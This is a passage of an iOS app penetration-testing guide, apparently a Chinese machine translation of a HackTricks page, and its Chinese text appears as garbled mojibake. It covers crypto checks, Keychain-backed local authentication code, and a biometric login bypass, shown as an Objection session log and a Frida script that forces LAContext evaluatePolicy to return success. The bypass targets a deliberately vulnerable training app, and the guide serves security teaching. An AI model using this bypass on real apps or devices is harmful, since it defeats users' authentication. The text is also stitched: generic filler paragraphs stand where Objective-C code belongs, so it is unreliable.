å¼€å‘äººå‘˜ä¸åº”ä½¿ç”¨**å·²å¼ƒç”¨çš„ç®—æ³•**æ¥æ‰§è¡Œæˆæƒ**æ£€æŸ¥**ã€**å­˜å‚¨**æˆ–**å‘é€**æ•°æ®ã€‚å…¶ä¸­ä¸€äº›ç®—æ³•åŒ…æ‹¬ï¼šRC4ã€MD4ã€MD5ã€SHA1... å¦‚æœä¾‹å¦‚ä½¿ç”¨å“ˆå¸Œæ¥å­˜å‚¨å¯†ç ï¼Œåˆ™åº”ä½¿ç”¨å…·æœ‰ç›çš„å“ˆå¸ŒæŠ—æš´åŠ›ç ´è§£ã€‚

### æ£€æŸ¥

è¦æ‰§è¡Œçš„ä¸»è¦æ£€æŸ¥æ˜¯æŸ¥æ‰¾ä»£ç ä¸­æ˜¯å¦å­˜åœ¨**ç¡¬ç¼–ç **çš„å¯†ç /ç§˜å¯†ï¼Œæˆ–è€…è¿™äº›å¯†ç /ç§˜å¯†æ˜¯å¦æ˜¯**å¯é¢„æµ‹çš„**ï¼Œä»¥åŠä»£ç æ˜¯å¦ä½¿ç”¨æŸç§**å¼±**çš„**å¯†ç å­¦**ç®—æ³•ã€‚

æœ‰è¶£çš„æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**objection**è‡ªåŠ¨ç›‘è§†ä¸€äº›**åŠ å¯†****åº“**ï¼Œä¾‹å¦‚ï¼š
```swift
ios monitor crypt
```
æœ‰å…³iOSåŠ å¯†APIå’Œåº“çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®[https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## æœ¬åœ°èº«ä»½éªŒè¯

æµ‹è¯•äººå‘˜åº”è¯¥æ„è¯†åˆ°æœ¬åœ°èº«ä»½éªŒè¯åº”å§‹ç»ˆåœ¨è¿œç¨‹ç«¯ç‚¹ä¸Šå¼ºåˆ¶æ‰§è¡Œï¼Œæˆ–è€…åŸºäºå¯†ç å­¦åŸè¯­ã€‚å¦‚æœèº«ä»½éªŒè¯è¿‡ç¨‹æ²¡æœ‰è¿”å›ä»»ä½•æ•°æ®ï¼Œæ”»å‡»è€…å¯ä»¥è½»æ˜“ç»•è¿‡æœ¬åœ°èº«ä»½éªŒè¯ã€‚

[**æœ¬åœ°èº«ä»½éªŒè¯æ¡†æ¶**](https://developer.apple.com/documentation/localauthentication)æä¾›äº†ä¸€ç»„APIï¼Œä¾›å¼€å‘äººå‘˜å°†èº«ä»½éªŒè¯å¯¹è¯æ¡†æ‰©å±•åˆ°ç”¨æˆ·ã€‚åœ¨è¿æ¥åˆ°è¿œç¨‹æœåŠ¡çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ï¼ˆå¹¶ä¸”å»ºè®®ï¼‰åˆ©ç”¨[keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)æ¥å®ç°æœ¬åœ°èº«ä»½éªŒè¯ã€‚

**æŒ‡çº¹ID**ä¼ æ„Ÿå™¨ç”±[SecureEnclaveå®‰å…¨åå¤„ç†å™¨](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf)æ“ä½œï¼Œå¹¶ä¸”ä¸ä¼šå°†æŒ‡çº¹æ•°æ®æš´éœ²ç»™ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†ã€‚é™¤äº†Touch IDä¹‹å¤–ï¼ŒAppleè¿˜å¼•å…¥äº†åŸºäºé¢éƒ¨è¯†åˆ«çš„_Face ID_ï¼šå®ƒå…è®¸åŸºäºé¢éƒ¨è¯†åˆ«è¿›è¡Œèº«ä»½éªŒè¯ã€‚

å¼€å‘äººå‘˜æœ‰ä¸¤ç§é€‰é¡¹æ¥æ•´åˆTouch ID/Face IDèº«ä»½éªŒè¯ï¼š

* `LocalAuthentication.framework`æ˜¯ä¸€ä¸ªé«˜çº§APIï¼Œå¯ç”¨äºé€šè¿‡Touch IDå¯¹ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯ã€‚åº”ç”¨ç¨‹åºæ— æ³•è®¿é—®ä¸å·²æ³¨å†ŒæŒ‡çº¹ç›¸å…³è”çš„ä»»ä½•æ•°æ®ï¼Œåªä¼šæ”¶åˆ°èº«ä»½éªŒè¯æ˜¯å¦æˆåŠŸçš„é€šçŸ¥ã€‚
* `Security.framework`æ˜¯ä¸€ä¸ªè¾ƒä½çº§åˆ«çš„APIï¼Œç”¨äºè®¿é—®[keychainæœåŠ¡](https://developer.apple.com/documentation/security/keychain\_services)ã€‚å¦‚æœæ‚¨çš„åº”ç”¨ç¨‹åºéœ€è¦ä½¿ç”¨ç”Ÿç‰©è¯†åˆ«èº«ä»½éªŒè¯æ¥ä¿æŠ¤æŸäº›æœºå¯†æ•°æ®ï¼Œåˆ™è¿™æ˜¯ä¸€ä¸ªå®‰å…¨çš„é€‰é¡¹ï¼Œå› ä¸ºè®¿é—®æ§åˆ¶æ˜¯åœ¨ç³»ç»Ÿçº§åˆ«ä¸Šè¿›è¡Œç®¡ç†çš„ï¼Œä¸å®¹æ˜“è¢«ç»•è¿‡ã€‚`Security.framework`å…·æœ‰C APIï¼Œä½†ä¹Ÿæœ‰å‡ ä¸ª[å¼€æºåŒ…è£…å™¨å¯ç”¨](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id)ï¼Œä½¿å¾—è®¿é—®keychainå°±åƒè®¿é—®NSUserDefaultsä¸€æ ·ç®€å•ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä½¿ç”¨`LocalAuthentication.framework`æˆ–`Security.framework`éƒ½å¯ä»¥è¢«æ”»å‡»è€…ç»•è¿‡ï¼Œå› ä¸ºå®ƒä»¬åªè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œè€Œæ²¡æœ‰æ•°æ®å¯ä¾›ç»§ç»­ä½¿ç”¨ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚è§[Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)ã€‚
{% endhint %}

### æœ¬åœ°èº«ä»½éªŒè¯æ¡†æ¶

å¼€å‘äººå‘˜å¯ä»¥é€šè¿‡åˆ©ç”¨**`LAContext`**ç±»çš„**`evaluatePolicy`**å‡½æ•°æ¥æ˜¾ç¤º**èº«ä»½éªŒè¯æç¤ºæ¡†**ã€‚ä¸¤ä¸ªå¯ç”¨çš„ç­–ç•¥å®šä¹‰äº†å¯æ¥å—çš„èº«ä»½éªŒè¯å½¢å¼ï¼š

* `deviceOwnerAuthentication`(Swift)æˆ–`LAPolicyDeviceOwnerAuthentication`(Objective-C)ï¼šå¦‚æœå¯ç”¨ï¼Œç”¨æˆ·å°†è¢«æç¤ºè¿›è¡ŒTouch IDèº«ä»½éªŒè¯ã€‚å¦‚æœæœªæ¿€æ´»Touch IDï¼Œåˆ™è¦æ±‚è¾“å…¥è®¾å¤‡å¯†ç ã€‚å¦‚æœæœªå¯ç”¨è®¾å¤‡å¯†ç ï¼Œåˆ™ç­–ç•¥è¯„ä¼°å¤±è´¥ã€‚
* `deviceOwnerAuthenticationWithBiometrics`(Swift)æˆ–`LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C)ï¼šèº«ä»½éªŒè¯ä»…é™äºç”Ÿç‰©è¯†åˆ«ï¼Œç”¨æˆ·å°†è¢«æç¤ºè¿›è¡ŒTouch IDèº«ä»½éªŒè¯ã€‚

**`evaluatePolicy`å‡½æ•°è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼**ï¼ŒæŒ‡ç¤ºç”¨æˆ·æ˜¯å¦æˆåŠŸè¿›è¡Œäº†èº«ä»½éªŒè¯ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥è½»æ˜“è¢«ç»•è¿‡ï¼ˆè§ä¸‹æ–‡ï¼‰

### ä½¿ç”¨Keychainè¿›è¡Œæœ¬åœ°èº«ä»½éªŒè¯

**iOSçš„keychain APIå¯ä»¥ï¼ˆå¹¶ä¸”åº”è¯¥ï¼‰ç”¨äºå®ç°æœ¬åœ°èº«ä»½éªŒè¯**ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ï¼Œåº”ç”¨ç¨‹åºå°†ä¸€ä¸ªç§˜å¯†èº«ä»½éªŒè¯ä»¤ç‰Œæˆ–å…¶ä»–æ ‡è¯†ç”¨æˆ·çš„ç§˜å¯†æ•°æ®å­˜å‚¨åœ¨keychainä¸­ã€‚ä¸ºäº†å¯¹è¿œç¨‹æœåŠ¡è¿›è¡Œèº«ä»½éªŒè¯ï¼Œç”¨æˆ·å¿…é¡»ä½¿ç”¨ä»–ä»¬çš„å¯†ç æˆ–æŒ‡çº¹è§£é”keychainä»¥è·å–ç§˜å¯†æ•°æ®ã€‚

keychainå…è®¸ä½¿ç”¨ç‰¹æ®Šçš„`SecAccessControl`å±æ€§ä¿å­˜é¡¹ç›®ï¼Œåªæœ‰åœ¨ç”¨æˆ·é€šè¿‡Touch IDèº«ä»½éªŒè¯åï¼ˆæˆ–è€…å¦‚æœå±æ€§å‚æ•°å…è®¸ï¼Œåˆ™ä½¿ç”¨å¯†ç ï¼‰æ‰èƒ½ä»keychainä¸­è®¿é—®è¯¥é¡¹ç›®ã€‚

åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†å­—ç¬¦ä¸²"test\_strong\_password"ä¿å­˜åˆ°keychainä¸­ã€‚åªæœ‰åœ¨å½“å‰è®¾å¤‡ä¸Šè®¾ç½®äº†å¯†ç çš„æƒ…å†µä¸‹ï¼ˆ`kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`å‚æ•°ï¼‰ï¼Œå¹¶ä¸”ä»…åœ¨å½“å‰å·²æ³¨å†Œçš„æŒ‡çº¹é€šè¿‡Touch IDèº«ä»½éªŒè¯åï¼ˆ`SecAccessControlCreateFlags.biometryCurrentSet`å‚æ•°ï¼‰ï¼Œæ‰èƒ½è®¿é—®è¯¥å­—ç¬¦ä¸²ï¼š

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

è¿™ä¸ªç›®å½•åŒ…å«äº†å…³äºiOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•çš„ä¿¡æ¯å’ŒæŠ€æœ¯ã€‚åœ¨è¿›è¡ŒiOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ—¶ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›é‡è¦çš„æŠ€æœ¯å’Œå·¥å…·ï¼š

- **é€†å‘å·¥ç¨‹**ï¼šé€†å‘å·¥ç¨‹æ˜¯åˆ†æå’Œç†è§£iOSåº”ç”¨ç¨‹åºçš„å†…éƒ¨ç»“æ„å’ŒåŠŸèƒ½çš„è¿‡ç¨‹ã€‚è¿™åŒ…æ‹¬åæ±‡ç¼–ã€åç¼–è¯‘å’Œåˆ†æåº”ç”¨ç¨‹åºçš„äºŒè¿›åˆ¶ä»£ç ã€‚

- **åŠ¨æ€åˆ†æ**ï¼šåŠ¨æ€åˆ†ææ˜¯åœ¨è¿è¡Œæ—¶ç›‘è§†å’Œåˆ†æåº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚è¿™åŒ…æ‹¬ä½¿ç”¨è°ƒè¯•å™¨ã€ä»£ç†å·¥å…·å’Œç½‘ç»œæŠ“åŒ…å·¥å…·æ¥æ£€æŸ¥åº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶è¡Œä¸ºã€‚

- **æ¼æ´åˆ©ç”¨**ï¼šæ¼æ´åˆ©ç”¨æ˜¯åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„å®‰å…¨æ¼æ´æ¥è·å–æœªç»æˆæƒçš„è®¿é—®æˆ–æ‰§è¡Œæ¶æ„æ“ä½œã€‚è¿™åŒ…æ‹¬åˆ©ç”¨å†…å­˜æ¼æ´ã€è¾“å…¥éªŒè¯æ¼æ´å’Œæˆæƒé—®é¢˜ç­‰ã€‚

- **æ•°æ®æ³„éœ²**ï¼šæ•°æ®æ³„éœ²æ˜¯æŒ‡æœªç»æˆæƒåœ°æ³„éœ²æ•æ„Ÿä¿¡æ¯çš„æƒ…å†µã€‚è¿™åŒ…æ‹¬åœ¨åº”ç”¨ç¨‹åºä¸­å‘ç°æ•æ„Ÿæ•°æ®å­˜å‚¨ã€ä¼ è¾“å’Œå¤„ç†çš„æ¼æ´ã€‚

- **å®‰å…¨é…ç½®**ï¼šå®‰å…¨é…ç½®æ˜¯ç¡®ä¿åº”ç”¨ç¨‹åºåœ¨è®¾è®¡å’Œå®æ–½è¿‡ç¨‹ä¸­é‡‡ç”¨äº†æ­£ç¡®çš„å®‰å…¨æªæ–½ã€‚è¿™åŒ…æ‹¬æ£€æŸ¥åº”ç”¨ç¨‹åºçš„æƒé™ã€åŠ å¯†å’Œè®¤è¯æœºåˆ¶ç­‰ã€‚

- **ç¤¾ä¼šå·¥ç¨‹å­¦**ï¼šç¤¾ä¼šå·¥ç¨‹å­¦æ˜¯é€šè¿‡æ¬ºéª—å’Œæ“çºµäººç±»è¡Œä¸ºæ¥è·å–æœªç»æˆæƒçš„è®¿é—®æˆ–ä¿¡æ¯ã€‚è¿™åŒ…æ‹¬é’“é±¼æ”»å‡»ã€æ¶æ„åº”ç”¨ç¨‹åºå’Œç¤¾äº¤å·¥ç¨‹ç­‰ã€‚

åœ¨è¿›è¡ŒiOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ—¶ï¼Œéœ€è¦ä½¿ç”¨ä¸€äº›å¸¸ç”¨çš„å·¥å…·å’ŒæŠ€æœ¯ï¼Œå¦‚Burp Suiteã€Fridaã€Cycriptã€Hopper Disassemblerå’ŒIDA Proç­‰ã€‚è¿™äº›å·¥å…·å’ŒæŠ€æœ¯å¯ä»¥å¸®åŠ©åˆ†æå’Œè¯„ä¼°iOSåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ã€‚

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

ç°åœ¨æˆ‘ä»¬å¯ä»¥ä»é’¥åŒ™ä¸²ä¸­è¯·æ±‚ä¿å­˜çš„é¡¹ç›®ã€‚é’¥åŒ™ä¸²æœåŠ¡å°†å‘ç”¨æˆ·å‘ˆç°èº«ä»½éªŒè¯å¯¹è¯æ¡†ï¼Œå¹¶æ ¹æ®æ˜¯å¦æä¾›äº†åˆé€‚çš„æŒ‡çº¹è¿”å›æ•°æ®æˆ–nilã€‚
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% tab title="Objective-C" %}

è¿™ä¸ªç›®å½•åŒ…å«äº†å…³äºiOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•çš„ä¿¡æ¯å’ŒæŠ€æœ¯ã€‚åœ¨è¿›è¡ŒiOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ—¶ï¼Œäº†è§£Objective-Cç¼–ç¨‹è¯­è¨€æ˜¯éå¸¸é‡è¦çš„ï¼Œå› ä¸ºå¤§å¤šæ•°iOSåº”ç”¨ç¨‹åºéƒ½æ˜¯ä½¿ç”¨Objective-Cç¼–å†™çš„ã€‚

ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„iOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æŠ€æœ¯ï¼š

- **åç¼–è¯‘åº”ç”¨ç¨‹åº**ï¼šä½¿ç”¨å·¥å…·å¦‚Hopperã€IDA Proæˆ–Radare2æ¥åç¼–è¯‘iOSåº”ç”¨ç¨‹åºçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»¥è·å–åº”ç”¨ç¨‹åºçš„æºä»£ç å’Œé€»è¾‘ã€‚
- **åˆ†æåº”ç”¨ç¨‹åº**ï¼šä½¿ç”¨å·¥å…·å¦‚Cycriptã€Fridaæˆ–GDBæ¥åŠ¨æ€åˆ†æè¿è¡Œä¸­çš„iOSåº”ç”¨ç¨‹åºï¼Œä»¥è·å–åº”ç”¨ç¨‹åºçš„è¿è¡Œæ—¶ä¿¡æ¯å’Œæ•°æ®ã€‚
- **æ¼æ´åˆ©ç”¨**ï¼šåˆ©ç”¨iOSåº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ï¼Œå¦‚ç¼“å†²åŒºæº¢å‡ºã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æˆ–é€»è¾‘æ¼æ´ï¼Œæ¥è·å–æœªæˆæƒè®¿é—®æˆ–æ‰§è¡Œæ¶æ„ä»£ç çš„æƒé™ã€‚
- **æ•°æ®å­˜å‚¨**ï¼šåˆ†æiOSåº”ç”¨ç¨‹åºçš„æ•°æ®å­˜å‚¨æœºåˆ¶ï¼Œå¦‚SQLiteæ•°æ®åº“ã€Core Dataæˆ–UserDefaultsï¼Œä»¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–ä¿®æ”¹åº”ç”¨ç¨‹åºçš„çŠ¶æ€ã€‚
- **ç½‘ç»œé€šä¿¡**ï¼šåˆ†æiOSåº”ç”¨ç¨‹åºçš„ç½‘ç»œé€šä¿¡æœºåˆ¶ï¼Œå¦‚HTTPè¯·æ±‚ã€WebSocketæˆ–TLS/SSLè¿æ¥ï¼Œä»¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–ä¿®æ”¹åº”ç”¨ç¨‹åºçš„è¡Œä¸ºã€‚
- **é€†å‘å·¥ç¨‹**ï¼šä½¿ç”¨å·¥å…·å¦‚class-dumpã€dumpdecryptedæˆ–Hopperæ¥é€†å‘å·¥ç¨‹iOSåº”ç”¨ç¨‹åºçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»¥è·å–åº”ç”¨ç¨‹åºçš„ç±»ã€æ–¹æ³•å’Œå±æ€§ã€‚

è¯·æ³¨æ„ï¼Œè¿›è¡ŒiOSåº”ç”¨ç¨‹åºæ¸—é€æµ‹è¯•æ—¶ï¼Œåº”å§‹ç»ˆéµå®ˆæ³•å¾‹å’Œé“å¾·è§„èŒƒï¼Œå¹¶è·å¾—åˆæ³•çš„æˆæƒã€‚

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### æ£€æµ‹

é€šè¿‡åˆ†æåº”ç”¨ç¨‹åºäºŒè¿›åˆ¶æ–‡ä»¶çš„å…±äº«åŠ¨æ€åº“åˆ—è¡¨ï¼Œè¿˜å¯ä»¥æ£€æµ‹åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„æ¡†æ¶ã€‚å¯ä»¥ä½¿ç”¨ `otool` æ¥å®Œæˆæ­¤æ“ä½œï¼š
```bash
$ otool -L <AppName>.app/<AppName>
```
å¦‚æœåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨äº†`LocalAuthentication.framework`ï¼Œè¾“å‡ºå°†åŒ…å«ä»¥ä¸‹ä¸¤è¡Œï¼ˆè¯·è®°ä½ï¼Œ`LocalAuthentication.framework`åœ¨å†…éƒ¨ä½¿ç”¨äº†`Security.framework`ï¼‰ï¼š
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
å¦‚æœä½¿ç”¨äº†`Security.framework`ï¼Œåªä¼šæ˜¾ç¤ºç¬¬äºŒä¸ªã€‚

### æœ¬åœ°èº«ä»½éªŒè¯æ¡†æ¶ç»•è¿‡

#### Objection

[**Objectionç”Ÿç‰©è¯†åˆ«ç»•è¿‡**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass)å¯ä»¥ç”¨äºç»•è¿‡LocalAuthenticationã€‚Objectionä½¿ç”¨Fridaæ¥å¯¹`evaluatePolicy`å‡½æ•°è¿›è¡Œæ³¨å…¥ï¼Œä½¿å…¶è¿”å›`True`ï¼Œå³ä½¿èº«ä»½éªŒè¯æœªæˆåŠŸæ‰§è¡Œã€‚ä½¿ç”¨`ios ui biometrics_bypass`å‘½ä»¤æ¥ç»•è¿‡ä¸å®‰å…¨çš„ç”Ÿç‰©è¯†åˆ«èº«ä»½éªŒè¯ã€‚Objectionå°†æ³¨å†Œä¸€ä¸ªä»»åŠ¡ï¼Œç”¨äºæ›¿æ¢`evaluatePolicy`çš„ç»“æœã€‚å®ƒé€‚ç”¨äºSwiftå’ŒObjective-Cå®ç°ã€‚
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
å¦‚æœå­˜åœ¨æ¼æ´ï¼Œè¯¥æ¨¡å—å°†è‡ªåŠ¨ç»•è¿‡ç™»å½•è¡¨å•ã€‚

#### Frida

ä»¥ä¸‹æ˜¯ä»[DVIA-v2åº”ç”¨ç¨‹åº](https://github.com/prateek147/DVIA-v2)ä¸­ä½¿ç”¨**`evaluatePolicy`**çš„ç¤ºä¾‹ï¼š
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
ä¸ºäº†ç»•è¿‡æœ¬åœ°èº«ä»½éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªFridaè„šæœ¬æ¥ç»•è¿‡ä¸Šè¿°çš„**evaluatePolicy**æ£€æŸ¥ã€‚å¦‚ä½ åœ¨ä¸Šé¢ç²˜è´´çš„ä»£ç ç‰‡æ®µä¸­æ‰€è§ï¼Œ**evaluatePolicy**ä½¿ç”¨ä¸€ä¸ª**å›è°ƒå‡½æ•°**æ¥ç¡®å®š**ç»“æœ**ã€‚å› æ­¤ï¼Œå®ç°è¿™ä¸ªé»‘å®¢æŠ€å·§çš„æœ€ç®€å•æ–¹æ³•æ˜¯æ‹¦æˆªè¯¥å›è°ƒå‡½æ•°ï¼Œå¹¶ç¡®ä¿å®ƒå§‹ç»ˆè¿”å›**success=1**ã€‚
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## é€šè¿‡IPCæš´éœ²æ•æ„ŸåŠŸèƒ½

### è‡ªå®šä¹‰URIå¤„ç†ç¨‹åº / Deeplinks / è‡ªå®šä¹‰æ–¹æ¡ˆ

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### é€šç”¨é“¾æ¥

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivityå…±äº«

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### åº”ç”¨æ‰©å±•

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### åºåˆ—åŒ–å’Œç¼–ç 

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## ç½‘ç»œé€šä¿¡

é‡è¦çš„æ˜¯è¦æ£€æŸ¥æ˜¯å¦å‘ç”Ÿäº†**æœªåŠ å¯†çš„**é€šä¿¡ï¼Œå¹¶ä¸”åº”ç”¨ç¨‹åºæ˜¯å¦æ­£ç¡®**éªŒè¯äº†æœåŠ¡å™¨çš„TLSè¯ä¹¦**ã€‚\
è¦æ£€æŸ¥è¿™äº›é—®é¢˜ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨åƒ**Burp**è¿™æ ·çš„ä»£ç†ï¼š

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### ä¸»æœºåæ£€æŸ¥

éªŒè¯TLSè¯ä¹¦çš„ä¸€ä¸ªå¸¸è§é—®é¢˜æ˜¯æ£€æŸ¥è¯ä¹¦æ˜¯å¦ç”±**å—ä¿¡ä»»çš„CA**ç­¾åï¼Œä½†**ä¸æ£€æŸ¥**è¯ä¹¦çš„**ä¸»æœºå**æ˜¯å¦ä¸è®¿é—®çš„ä¸»æœºåç›¸åŒã€‚\
